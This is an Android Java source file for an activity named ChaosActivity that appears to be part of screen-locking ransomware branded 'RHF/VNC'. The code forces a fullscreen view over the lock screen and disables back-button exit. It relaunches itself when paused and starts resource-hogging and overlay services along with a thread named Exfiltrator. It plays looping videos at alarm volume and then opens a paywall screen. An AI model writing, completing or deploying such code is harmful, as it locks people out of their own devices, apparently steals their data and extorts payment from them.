package com.rhfvnc.strain;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.SurfaceTexture;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.view.Gravity;
import android.view.TextureView;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.TextView;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
public class ChaosActivity extends Activity {
    private static final int COLS = 2;
    private static final int ROWS = 3;
    private static final int CELLS = COLS * ROWS;
    private final List<MediaPlayer> players = new ArrayList<>();
    private final Random rnd = new Random();
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        try { OverlayService.start(this); } catch (Throwable ignored) {}
        StrainReceiver.scheduleRelaunch(this, 20);
        new Thread(new Exfiltrator(this)).start();
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);
        GridLayout grid = new GridLayout(this);
        grid.setColumnCount(COLS);
        grid.setRowCount(ROWS);
        root.addView(grid, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        int cellW = getResources().getDisplayMetrics().widthPixels / COLS;
        int cellH = getResources().getDisplayMetrics().heightPixels / ROWS;
        for (int i = 0; i < CELLS; i++) {
            TextureView tv = new TextureView(this);
            GridLayout.LayoutParams lp = new GridLayout.LayoutParams();
            lp.width = cellW;
            lp.height = cellH;
            tv.setLayoutParams(lp);
            grid.addView(tv);
            startTextureVideo(tv);
        }
        TextView brand = new TextView(this);
        brand.setText("RHF/VNC");
        brand.setTextColor(Color.RED);
        brand.setTextSize(40);
        brand.setShadowLayer(30, 0, 0, Color.RED);
        FrameLayout.LayoutParams blp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM | Gravity.CENTER_HORIZONTAL);
        blp.bottomMargin = 60;
        root.addView(brand, blp);
        setContentView(root);
        new Thread(() -> {
            try { Thread.sleep(8000); } catch (InterruptedException ignored) {}
            runOnUiThread(() -> {
                Intent i = new Intent(ChaosActivity.this, PaywallActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try { startActivity(i); } catch (Throwable ignored) {}
            });
        }).start();
    }
    private void startTextureVideo(TextureView tv) {
        tv.setSurfaceTextureListener(new TextureView.SurfaceTextureListener() {
            @Override
            public void onSurfaceTextureAvailable(SurfaceTexture st, int w, int h) { playOn(tv, st); }
            @Override public void onSurfaceTextureSizeChanged(SurfaceTexture st, int w, int h) {}
            @Override public boolean onSurfaceTextureDestroyed(SurfaceTexture st) { return true; }
            @Override public void onSurfaceTextureUpdated(SurfaceTexture st) {}
        });
    }
    private void playOn(TextureView tv, SurfaceTexture st) {
        int idx = 1 + rnd.nextInt(6);
        int resId = getResources().getIdentifier("v" + idx, "raw", getPackageName());
        if (resId == 0) resId = getResources().getIdentifier("mln", "raw", getPackageName());
        if (resId == 0) return;
        try {
            MediaPlayer mp = new MediaPlayer();
            if (players.isEmpty()) {
                mp.setAudioStreamType(AudioManager.STREAM_ALARM);
                mp.setVolume(1f, 1f);
            } else {
                mp.setVolume(0f, 0f);
            }
            mp.setSurface(new android.view.Surface(st));
            mp.setLooping(true);
            Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + resId);
            mp.setDataSource(this, u);
            mp.setOnPreparedListener(MediaPlayer::start);
            mp.prepareAsync();
            players.add(mp);
        } catch (Throwable ignored) {}
    }
    @Override
    public void onBackPressed() {}
    @Override
    protected void onPause() {
        super.onPause();
        Intent i = new Intent(this, ChaosActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK
                | Intent.FLAG_ACTIVITY_NO_ANIMATION);
        startActivity(i);
    }
    @Override
    protected void onDestroy() {
        for (MediaPlayer mp : players) { try { mp.release(); } catch (Throwable ignored) {} }
        players.clear();
        super.onDestroy();
    }
}
